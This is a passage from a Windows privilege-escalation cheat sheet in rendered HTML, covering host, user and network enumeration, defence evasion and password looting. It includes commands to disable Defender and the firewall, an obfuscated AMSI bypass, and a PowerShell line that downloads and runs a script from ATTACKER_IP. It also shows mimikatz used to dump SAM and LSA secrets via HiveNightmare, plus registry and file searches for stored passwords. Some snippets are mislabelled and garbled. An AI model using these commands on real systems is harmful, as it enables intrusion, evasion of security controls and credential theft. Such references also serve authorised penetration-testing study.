</span></span></code></pre></div></li><li><a href=https://github.com/pentestmonkey/windows-privesc-check>windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems</a></li><li><a href=https://github.com/abatchy17/WindowsExploits>WindowsExploits - Windows exploits, mostly precompiled. Not being updated.</a></li><li><a href=https://github.com/absolomb/WindowsEnum>WindowsEnum - A Powershell Privilege Escalation Enumeration Script.</a></li><li><a href=https://github.com/GhostPack/Seatbelt>Seatbelt - A C# project that performs a number of security oriented host-survey &ldquo;safety checks&rdquo; relevant from both offensive and defensive security perspectives.</a><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Seatbelt.exe -group=all -full
</span></span><span style=display:flex><span>Seatbelt.exe -group=system -outputfile=<span style=color:#e6db74>&#34;C:\Temp\system.txt&#34;</span>
</span></span><span style=display:flex><span>Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=<span style=color:#ae81ff>192.168</span>.230.209 -username=THESHIRE\sam -password=<span style=color:#e6db74>&#34;yum \&#34;</span>po-ta-toes\<span style=color:#e6db74>&#34;&#34;</span>
</span></span></code></pre></div></li><li><a href=https://github.com/M4ximuss/Powerless>Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind</a></li><li><a href=https://github.com/411Hall/JAWS>JAWS - Just Another Windows (Enum) Script</a><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>powershell.exe -ExecutionPolicy Bypass <span style=color:#f92672>-File</span> .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
</span></span></code></pre></div></li><li><a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe>winPEAS - Windows Privilege Escalation Awesome Script</a></li><li><a href=https://github.com/bitsadmin/wesng>Windows Exploit Suggester - Next Generation (WES-NG)</a><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># First obtain systeminfo</span>
</span></span><span style=display:flex><span>systeminfo
</span></span><span style=display:flex><span>systeminfo &gt; systeminfo.txt
</span></span><span style=display:flex><span><span style=color:#75715e># Then feed it to wesng</span>
</span></span><span style=display:flex><span>python3 wes.py --update-wes
</span></span><span style=display:flex><span>python3 wes.py --update
</span></span><span style=display:flex><span>python3 wes.py systeminfo.txt
</span></span></code></pre></div></li><li><a href=https://github.com/itm4n/PrivescCheck>PrivescCheck - Privilege Escalation Enumeration Script for Windows</a><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\Temp\&gt;powershell -ep bypass -c <span style=color:#e6db74>&#34;. .\PrivescCheck.ps1; Invoke-PrivescCheck&#34;</span>
</span></span><span style=display:flex><span>C:\Temp\&gt;powershell -ep bypass -c <span style=color:#e6db74>&#34;. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended&#34;</span>
</span></span><span style=display:flex><span>C:\Temp\&gt;powershell -ep bypass -c <span style=color:#e6db74>&#34;. .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML&#34;</span>
</span></span></code></pre></div></li></ul><h2 id=windows-version-and-configuration>Windows Version and Configuration
<a class=anchor href=#windows-version-and-configuration>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>systeminfo | findstr /B /C:<span style=color:#e6db74>&#34;OS Name&#34;</span> /C:<span style=color:#e6db74>&#34;OS Version&#34;</span>
</span></span></code></pre></div><p>Extract patchs and updates</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>wmic qfe
</span></span></code></pre></div><p>Architecture</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>wmic os get osarchitecture || echo <span style=color:#66d9ef>%</span>PROCESSOR_ARCHITECTURE%
</span></span></code></pre></div><p>List all env variables</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>set
</span></span><span style=display:flex><span>Get-ChildItem Env<span style=color:#960050;background-color:#1e0010>:</span> | ft Key,Value
</span></span></code></pre></div><p>List all drives</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>wmic logicaldisk get caption || fsutil fsinfo drives
</span></span><span style=display:flex><span>wmic logicaldisk get caption,description,providername
</span></span><span style=display:flex><span>Get-PSDrive | where {$_.Provider <span style=color:#f92672>-like</span> <span style=color:#e6db74>&#34;Microsoft.PowerShell.Core\FileSystem&#34;</span>}| ft Name,Root
</span></span></code></pre></div><h2 id=user-enumeration>User Enumeration
<a class=anchor href=#user-enumeration>#</a></h2><p>Get current username</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>echo <span style=color:#66d9ef>%</span>USERNAME% || whoami
</span></span><span style=display:flex><span>$env:username
</span></span></code></pre></div><p>List user privilege</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>whoami /priv
</span></span><span style=display:flex><span>whoami /groups
</span></span></code></pre></div><p>List all users</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>net user
</span></span><span style=display:flex><span>whoami /all
</span></span><span style=display:flex><span>Get-LocalUser | ft Name,Enabled,LastLogon
</span></span><span style=display:flex><span>Get-ChildItem C:\Users -Force | select Name
</span></span></code></pre></div><p>List logon requirements; useable for bruteforcing</p><pre tabindex=0><code class=language-powershell$env:usernadsc data-lang=powershell$env:usernadsc>net accounts
</code></pre><p>Get details about a user (i.e. administrator, admin, current user)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>net user administrator
</span></span><span style=display:flex><span>net user admin
</span></span><span style=display:flex><span>net user <span style=color:#66d9ef>%</span>USERNAME%
</span></span></code></pre></div><p>List all local groups</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>net localgroup
</span></span><span style=display:flex><span>Get-LocalGroup | ft Name
</span></span></code></pre></div><p>Get details about a group (i.e. administrators)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>net localgroup administrators
</span></span><span style=display:flex><span>Get-LocalGroupMember Administrators | ft Name, PrincipalSource
</span></span><span style=display:flex><span>Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
</span></span></code></pre></div><p>Get Domain Controllers</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>nltest /DCLIST<span style=color:#960050;background-color:#1e0010>:</span>DomainName
</span></span><span style=display:flex><span>nltest /DCNAME<span style=color:#960050;background-color:#1e0010>:</span>DomainName
</span></span><span style=display:flex><span>nltest /DSGETDC<span style=color:#960050;background-color:#1e0010>:</span>DomainName
</span></span></code></pre></div><h2 id=network-enumeration>Network Enumeration
<a class=anchor href=#network-enumeration>#</a></h2><p>List all network interfaces, IP, and DNS.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>ipconfig /all
</span></span><span style=display:flex><span>Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
</span></span><span style=display:flex><span>Get-DnsClientServerAddress -AddressFamily IPv4 | ft
</span></span></code></pre></div><p>List current routing table</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>route print
</span></span><span style=display:flex><span>Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
</span></span></code></pre></div><p>List the ARP table</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>arp -A
</span></span><span style=display:flex><span>Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
</span></span></code></pre></div><p>List all current connections</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>netstat -ano
</span></span></code></pre></div><p>List all network shares</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>net share
</span></span><span style=display:flex><span>powershell Find-DomainShare -ComputerDomain domain.local
</span></span></code></pre></div><p>SNMP Configuration</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
</span></span><span style=display:flex><span>Get-ChildItem -path HKLM<span style=color:#960050;background-color:#1e0010>:</span>\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
</span></span></code></pre></div><h2 id=antivirus--detections>Antivirus & Detections
<a class=anchor href=#antivirus--detections>#</a></h2><p>Enumerate antivirus on a box with <code>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName</code></p><h3 id=windows-defender>Windows Defender
<a class=anchor href=#windows-defender>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># check status of Defender</span>
</span></span><span style=display:flex><span>PS C:\&gt; Get-MpComputerStatus
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># disable scanning all downloaded files and attachments, disable AMSI (reactive)</span>
</span></span><span style=display:flex><span>PS C:\&gt; Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
</span></span><span style=display:flex><span>PS C:\&gt; Set-MpPreference -DisableIOAVProtection $true
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># disable AMSI (set to 0 to enable)</span>
</span></span><span style=display:flex><span>PS C:\&gt; Set-MpPreference -DisableScriptScanning <span style=color:#ae81ff>1</span> 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># exclude a folder</span>
</span></span><span style=display:flex><span>PS C:\&gt; Add-MpPreference -ExclusionPath <span style=color:#e6db74>&#34;C:\Temp&#34;</span>
</span></span><span style=display:flex><span>PS C:\&gt; Add-MpPreference -ExclusionPath <span style=color:#e6db74>&#34;C:\Windows\Tasks&#34;</span>
</span></span><span style=display:flex><span>PS C:\&gt; Set-MpPreference -ExclusionProcess <span style=color:#e6db74>&#34;word.exe&#34;</span>, <span style=color:#e6db74>&#34;vmwp.exe&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># remove signatures (if Internet connection is present, they will be downloaded again):</span>
</span></span><span style=display:flex><span>PS &gt; &amp; <span style=color:#e6db74>&#34;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe&#34;</span> -RemoveDefinitions -All
</span></span><span style=display:flex><span>PS &gt; &amp; <span style=color:#e6db74>&#34;C:\Program Files\Windows Defender\MpCmdRun.exe&#34;</span> -RemoveDefinitions -All
</span></span></code></pre></div><h3 id=firewall>Firewall
<a class=anchor href=#firewall>#</a></h3><p>List firewall state and current configuration</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>netsh advfirewall firewall dump
</span></span><span style=display:flex><span><span style=color:#75715e># or </span>
</span></span><span style=display:flex><span>netsh firewall show state
</span></span><span style=display:flex><span>netsh firewall show config
</span></span></code></pre></div><p>List firewall&rsquo;s blocked ports</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action <span style=color:#f92672>-eq</span> <span style=color:#e6db74>&#34;0&#34;</span>} | select name,applicationname,localports
</span></span></code></pre></div><p>Disable firewall</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># Disable Firewall on Windows 7 via cmd</span>
</span></span><span style=display:flex><span>reg add <span style=color:#e6db74>&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server&#34;</span>  /v fDenyTSConnections /t REG_DWORD /d <span style=color:#ae81ff>0</span> /f
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Disable Firewall on Windows 7 via Powershell</span>
</span></span><span style=display:flex><span>powershell.exe -ExecutionPolicy Bypass -command <span style=color:#e6db74>&#39;Set-ItemProperty -Path &#34;HKLM:\System\CurrentControlSet\Control\Terminal Server&#34; -Name &#34;fDenyTSConnections&#34; â€“Value&#39;</span>`
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Disable Firewall on any windows via cmd</span>
</span></span><span style=display:flex><span>netsh firewall set opmode disable
</span></span><span style=display:flex><span>netsh Advfirewall set allprofiles state off
</span></span></code></pre></div><h3 id=applocker-enumeration>AppLocker Enumeration
<a class=anchor href=#applocker-enumeration>#</a></h3><ul><li>With the GPO</li><li><code>HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2</code> (Keys: Appx, Dll, Exe, Msi and Script).</li></ul><ul><li><p>List AppLocker rules</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>PowerView PS C:\&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
</span></span></code></pre></div></li><li><p>AppLocker Bypass</p><ul><li>By default, <code>C:\Windows</code> is not blocked, and <code>C:\Windows\Tasks</code> is writtable by any users</li><li><a href=https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md>https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a></li><li><a href=https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md>https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md</a></li><li><a href=https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md>https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md</a></li></ul></li></ul><h3 id=powershell>Powershell
<a class=anchor href=#powershell>#</a></h3><p>Default powershell locations in a Windows system.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\windows\syswow64\windowspowershell\v1.<span style=color:#ae81ff>0</span>\powershell
</span></span><span style=display:flex><span>C:\Windows\System32\WindowsPowerShell\v1.<span style=color:#ae81ff>0</span>\powershell
</span></span></code></pre></div><h4 id=powershell-constrained-mode>Powershell Constrained Mode
<a class=anchor href=#powershell-constrained-mode>#</a></h4><ul><li>Check if we are in a constrained mode: <code>$ExecutionContext.SessionState.LanguageMode</code></li><li><a href=https://github.com/calebstewart/bypass-clm>bypass-clm - PowerShell Constrained Language Mode Bypass</a></li><li><a href=https://github.com/p3nt4/PowerShdll>PowerShdll - Powershell with no Powershell.exe via DLL&rsquo;s</a>: <code>rundll32.exe C:\temp\PowerShdll.dll,main</code></li><li>Other bypasses<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>PS &gt; &amp;{ whoami }
</span></span><span style=display:flex><span>powershell.exe -v <span style=color:#ae81ff>2</span> -ep bypass -command <span style=color:#e6db74>&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;http://ATTACKER_IP/rev.ps1&#39;)&#34;</span>
</span></span></code></pre></div></li></ul><h4 id=amsi-bypass>AMSI Bypass
<a class=anchor href=#amsi-bypass>#</a></h4><p>Find more AMSI bypass: <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md>here</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>PS C:\&gt; [<span style=color:#66d9ef>Ref</span>].Assembly.GetType(<span style=color:#e6db74>&#39;System.Management.Automation.Ams&#39;</span>+<span style=color:#e6db74>&#39;iUtils&#39;</span>).GetField(<span style=color:#e6db74>&#39;am&#39;</span>+<span style=color:#e6db74>&#39;siInitFailed&#39;</span>,<span style=color:#e6db74>&#39;NonPu&#39;</span>+<span style=color:#e6db74>&#39;blic,Static&#39;</span>).SetValue($null,$true)
</span></span></code></pre></div><h3 id=default-writeable-folders>Default Writeable Folders
<a class=anchor href=#default-writeable-folders>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
</span></span><span style=display:flex><span>C:\Windows\System32\spool\drivers\color
</span></span><span style=display:flex><span>C:\Windows\System32\spool\printers
</span></span><span style=display:flex><span>C:\Windows\System32\spool\servers
</span></span><span style=display:flex><span>C:\Windows\tracing
</span></span><span style=display:flex><span>C:\Windows\Temp
</span></span><span style=display:flex><span>C:\Users\Public
</span></span><span style=display:flex><span>C:\Windows\Tasks
</span></span><span style=display:flex><span>C:\Windows\System32\tasks
</span></span><span style=display:flex><span>C:\Windows\SysWOW64\tasks
</span></span><span style=display:flex><span>C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
</span></span><span style=display:flex><span>C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
</span></span><span style=display:flex><span>C:\Windows\debug\wia
</span></span><span style=display:flex><span>C:\Windows\registration\crmlog
</span></span><span style=display:flex><span>C:\Windows\System32\com\dmp
</span></span><span style=display:flex><span>C:\Windows\SysWOW64\com\dmp
</span></span><span style=display:flex><span>C:\Windows\System32\fxstmp
</span></span><span style=display:flex><span>C:\Windows\SysWOW64\fxstmp
</span></span></code></pre></div><h2 id=eop---looting-for-passwords>EoP - Looting for passwords
<a class=anchor href=#eop---looting-for-passwords>#</a></h2><h3 id=sam-and-system-files>SAM and SYSTEM files
<a class=anchor href=#sam-and-system-files>#</a></h3><p>The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># Usually %SYSTEMROOT% = C:\Windows</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>%</span>SYSTEMROOT%\repair\SAM
</span></span><span style=display:flex><span><span style=color:#66d9ef>%</span>SYSTEMROOT%\System32\config\RegBack\SAM
</span></span><span style=display:flex><span><span style=color:#66d9ef>%</span>SYSTEMROOT%\System32\config\SAM
</span></span><span style=display:flex><span><span style=color:#66d9ef>%</span>SYSTEMROOT%\repair\system
</span></span><span style=display:flex><span><span style=color:#66d9ef>%</span>SYSTEMROOT%\System32\config\SYSTEM
</span></span><span style=display:flex><span><span style=color:#66d9ef>%</span>SYSTEMROOT%\System32\config\RegBack\system
</span></span></code></pre></div><p>Generate a hash file for John using <code>pwdump</code> or <code>samdump2</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>pwdump SYSTEM SAM &gt; /root/sam.txt
</span></span><span style=display:flex><span>samdump2 SYSTEM SAM -o sam.txt
</span></span></code></pre></div><p>Either crack it with <code>john -format=NT /root/sam.txt</code>, <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md#hashcat>hashcat</a> or use Pass-The-Hash.</p><h3 id=laps-settings>LAPS Settings
<a class=anchor href=#laps-settings>#</a></h3><p>Extract <code>HKLM\Software\Policies\Microsoft Services\AdmPwd</code> from Windows Registry.</p><ul><li>LAPS Enabled: AdmPwdEnabled</li><li>LAPS Admin Account Name: AdminAccountName</li><li>LAPS Password Complexity: PasswordComplexity</li><li>LAPS Password Length: PasswordLength</li><li>LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled</li></ul><h3 id=hivenightmare>HiveNightmare
<a class=anchor href=#hivenightmare>#</a></h3><blockquote><p>CVE-2021â€“36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user</p></blockquote><p>Check for the vulnerability using <code>icacls</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\Windows\System32&gt; icacls config\SAM
</span></span><span style=display:flex><span>config\SAM BUILTIN\Administrators<span style=color:#960050;background-color:#1e0010>:</span>(I)(F)
</span></span><span style=display:flex><span>           NT AUTHORITY\SYSTEM<span style=color:#960050;background-color:#1e0010>:</span>(I)(F)
</span></span><span style=display:flex><span>           BUILTIN\Users<span style=color:#960050;background-color:#1e0010>:</span>(I)(RX)    &lt;-- this is wrong - regular users should not have read access!
</span></span></code></pre></div><p>Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>mimikatz&gt; token::whoami /full
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># List shadow copies available</span>
</span></span><span style=display:flex><span>mimikatz&gt; misc::shadowcopies
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Extract account from SAM databases</span>
</span></span><span style=display:flex><span>mimikatz&gt; lsadump::sam /system<span style=color:#960050;background-color:#1e0010>:</span>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam<span style=color:#960050;background-color:#1e0010>:</span>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Extract secrets from SECURITY</span>
</span></span><span style=display:flex><span>mimikatz&gt; lsadump::secrets /system<span style=color:#960050;background-color:#1e0010>:</span>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security<span style=color:#960050;background-color:#1e0010>:</span>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
</span></span></code></pre></div><h3 id=search-for-file-contents>Search for file contents
<a class=anchor href=#search-for-file-contents>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>cd C:\ &amp; findstr /SI /M <span style=color:#e6db74>&#34;password&#34;</span> *.xml *.ini *.txt
</span></span><span style=display:flex><span>findstr /si password *.xml *.ini *.txt *.config
</span></span><span style=display:flex><span>findstr /spin <span style=color:#e6db74>&#34;password&#34;</span> *.*
</span></span></code></pre></div><h3 id=search-for-a-file-with-a-certain-filename>Search for a file with a certain filename
<a class=anchor href=#search-for-a-file-with-a-certain-filename>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
</span></span><span style=display:flex><span>where /R C:\ user.txt
</span></span><span style=display:flex><span>where /R C:\ *.ini
</span></span></code></pre></div><h3 id=search-the-registry-for-key-names-and-passwords>Search the registry for key names and passwords
<a class=anchor href=#search-the-registry-for-key-names-and-passwords>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>REG QUERY HKLM /F <span style=color:#e6db74>&#34;password&#34;</span> /t REG_SZ /S /K
</span></span><span style=display:flex><span>REG QUERY HKCU /F <span style=color:#e6db74>&#34;password&#34;</span> /t REG_SZ /S /K
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>reg query <span style=color:#e6db74>&#34;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&#34;</span> <span style=color:#75715e># Windows Autologin</span>
</span></span><span style=display:flex><span>reg query <span style=color:#e6db74>&#34;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&#34;</span> <span style=color:#ae81ff>2</span>&gt;nul | findstr <span style=color:#e6db74>&#34;DefaultUserName DefaultDomainName DefaultPassword&#34;</span> 
</span></span><span style=display:flex><span>reg query <span style=color:#e6db74>&#34;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&#34;</span> <span style=color:#75715e># SNMP parameters</span>
</span></span><span style=display:flex><span>reg query <span style=color:#e6db74>&#34;HKCU\Software\SimonTatham\PuTTY\Sessions&#34;</span> <span style=color:#75715e># Putty clear text proxy credentials</span>
</span></span><span style=display:flex><span>reg query <span style=color:#e6db74>&#34;HKCU\Software\ORL\WinVNC3\Password&#34;</span> <span style=color:#75715e># VNC credentials</span>
</span></span><span style=display:flex><span>reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>reg query HKLM /f password /t REG_SZ /s
</span></span><span style=display:flex><span>reg query HKCU /f password /t REG_SZ /s
</span></span></code></pre></div><h3 id=read-a-value-of-a-certain-sub-key>Read a value of a certain sub key
<a class=anchor href=#read-a-value-of-a-certain-sub-key>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>REG QUERY <span style=color:#e6db74>&#34;HKLM\Software\Microsoft\FTH&#34;</span> /V RuleList
</span></span></code></pre></div><h3 id=passwords-in-unattendxml>Passwords in unattend.xml
<a class=anchor href=#passwords-in-unattendxml>#</a></h3><p>Location of the unattend.xml files.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\unattend.xml
</span></span><span style=display:flex><span>C:\Windows\Panther\Unattend.xml
</span></span><span style=display:flex><span>C:\Windows\Panther\Unattend\Unattend.xml
</span></span><span style=display:flex><span>C:\Windows\system32\sysprep.inf
</span></span><span style=display:flex><span>C:\Windows\system32\sysprep\sysprep.xml
